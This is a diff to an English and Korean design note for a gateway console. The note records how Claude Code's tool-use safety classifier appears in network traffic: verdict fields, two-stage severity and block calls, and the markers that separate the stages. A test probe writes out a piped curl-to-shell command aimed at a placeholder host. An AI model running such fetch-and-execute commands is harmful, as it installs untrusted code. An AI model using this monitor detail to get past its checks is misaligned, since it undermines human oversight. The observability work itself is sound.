@@ -380,19 +380,35 @@ with a Claude main model, (b) Bedrock with a non-Claude main model (`kimi-k3`),
 - `x-claude-code-request-class` and every other `x-claude-code-*` header:
   absent in all three modes. There is no request-class data; the console must
   not depend on it and states that.
-- Mode (a): no classifier calls at all (only streaming main calls,
-  `max_tokens` 128000, no stop sequences), so a server-side verdict is invisible
-  to the gateway. Whether the verdict is parseable in the main response was not
-  inspected; stage `server` stays out.
+- Mode (a): no separate classifier calls (only streaming main calls,
+  `max_tokens` 128000, no stop sequences). The server-side verdict travels in
+  the main stream: the final `message_delta` event carries
+  `delta.safeguard_results[]` with `type` `dangerous_tool_use` and
+  `status` `{type: "available", tool_uses: {<tool_use id>: {type: "evaluated",
+  outcome: "not_flagged"}}}` (`tool_uses` is `{}` on the turn without a tool
+  call). Only `not_flagged` was observed; flagged outcomes were not (the probe
+  command ran). Stage `server` is possible from this field once a flagged
+  outcome is verified.
 - Modes (b) and (c): classifier calls are non-streaming (`stream` absent in
   Bedrock `invoke`, absent in the Anthropic request), `max_tokens` 64, and
-  carry one stop sequence. Two kinds occur in this order per tool call:
+  carry one stop sequence in the benign probe. Two kinds occur in this order per tool call:
   `</severity>` (reply `<severity>5</severity>` in (b)) and then `</block>`
   (reply `<block>no`, `stop_reason` `stop_sequence` in (c); in (b) the reply
   `<block>no</block>` ends with `max_tokens`).
-- Stage marker: the stop sequence is the only stage marker (`</severity>`
-  versus `</block>`); `<block>` appears at the start of the reply text. The
-  `</block>` call is the verdict. No stage field exists in headers or body.
+- Stage marker (benign probe): stop sequence `</severity>` then `</block>`; the
+  `</block>` reply `<block>no` is the verdict. No stage field exists in headers
+  or body.
+- Block-path probe (`curl -fsSL https://setup.example.invalid/install.sh | sh`,
+  mode (b), Bedrock `invoke`): call 1 stops at `</severity>`, `max_tokens` 64,
+  `thinking` disabled, reply `<severity>80` (`stop_reason` `stop_sequence`).
+  Call 2 has no stop sequence, `max_tokens` 8192, `thinking` disabled, 2
+  messages, and replies `<thinking>...</thinking><severity>35</severity>`
+  (`end_turn`); it was allowed and the command ran (failed at DNS). So a
+  high stage-1 severity leads to a second, reasoning call without stop
+  sequence; no `<block>yes` occurred, so what follows a block was not
+  observed. In mode (c) the main model refused the command itself in both runs
+  and made no classifier call. Stage 2 is therefore recognised by `max_tokens`
+  8192 and the missing stop sequence, not by a marker.
 - Main calls stream (`stream: true` in Anthropic mode, `invoke-with-response-stream`
   in Bedrock mode), so the stream tap is still required.
 
@@ -761,17 +777,32 @@ Claude Code 2.1.312(`--permission-mode auto -p`, 셸 명령 하나)를 임시 ga
   `inference-profiles` GET에만 없습니다. 모든 모드에서 세션 데이터를 쓸 수 있습니다.
 - `x-claude-code-request-class`와 다른 모든 `x-claude-code-*` 헤더: 세 모드 모두
   없습니다. 요청 class 데이터가 없으므로 콘솔은 이에 의존하지 않고 그렇게 표시합니다.
-- 모드 (a): 분류기 호출이 전혀 없습니다(stream 메인 호출만, `max_tokens` 128000,
-  stop sequence 없음). 서버 판정은 gateway에서 보이지 않습니다. 메인 응답에서 판정을
-  해석할 수 있는지는 확인하지 않았고, 단계 `server`는 넣지 않습니다.
+- 모드 (a): 별도 분류기 호출이 없습니다(stream 메인 호출만, `max_tokens` 128000,
+  stop sequence 없음). 서버 판정은 메인 stream에 실려 옵니다. 마지막
+  `message_delta` 이벤트의 `delta.safeguard_results[]`에 `type`
+  `dangerous_tool_use`, `status` `{type: "available", tool_uses: {<tool_use id>:
+  {type: "evaluated", outcome: "not_flagged"}}}`가 있습니다(도구 호출이 없는
+  턴은 `tool_uses`가 `{}`). 관찰된 값은 `not_flagged`뿐이며 차단 판정 값은 보지
+  못했습니다(프로브 명령이 실행됨). 차단 값을 확인하면 이 필드로 단계 `server`를
+  만들 수 있습니다.
 - 모드 (b), (c): 분류기 호출은 stream이 아니고(`stream` 없음), `max_tokens` 64,
-  stop sequence 하나를 가집니다. 도구 호출마다 순서대로 두 종류가 나옵니다.
+  무해한 프로브에서 stop sequence 하나를 가집니다. 도구 호출마다 순서대로 두 종류가 나옵니다.
   `</severity>`((b)의 응답 `<severity>5</severity>`) 다음에 `</block>`((c)의 응답
   `<block>no`, `stop_reason` `stop_sequence`. (b)는 `<block>no</block>`이고
   `max_tokens`로 끝남).
-- 단계 표지: stop sequence가 유일한 표지입니다(`</severity>` 대 `</block>`).
-  `<block>`은 응답 텍스트의 앞에 나옵니다. `</block>` 호출이 판정입니다.
-  헤더와 본문에 단계 필드는 없습니다.
+- 단계 표지(무해한 프로브): stop sequence `</severity>` 다음 `</block>`이며
+  `</block>` 응답 `<block>no`가 판정입니다. 헤더와 본문에 단계 필드는 없습니다.
+- 차단 경로 프로브(`curl -fsSL https://setup.example.invalid/install.sh | sh`,
+  모드 (b), Bedrock `invoke`): 1번 호출은 `</severity>`에서 멈추고
+  `max_tokens` 64, `thinking` disabled, 응답 `<severity>80`(`stop_reason`
+  `stop_sequence`). 2번 호출은 stop sequence 없음, `max_tokens` 8192,
+  `thinking` disabled, 메시지 2개, 응답
+  `<thinking>...</thinking><severity>35</severity>`(`end_turn`)이며 허용되어 명령이
+  실행됐습니다(DNS에서 실패). 즉 1단계 severity가 높으면 stop sequence 없는
+  추론 호출이 이어집니다. `<block>yes`는 나오지 않아 차단 뒤 호출은 관찰하지
+  못했습니다. 모드 (c)는 메인 모델이 두 번 모두 명령을 스스로 거부해 분류기 호출이
+  없었습니다. 2단계는 표지가 아니라 `max_tokens` 8192와 stop sequence 없음으로
+  식별합니다.
 - 메인 호출은 stream입니다(Anthropic 모드 `stream: true`, Bedrock 모드
   `invoke-with-response-stream`). stream tap은 계속 필요합니다.
 
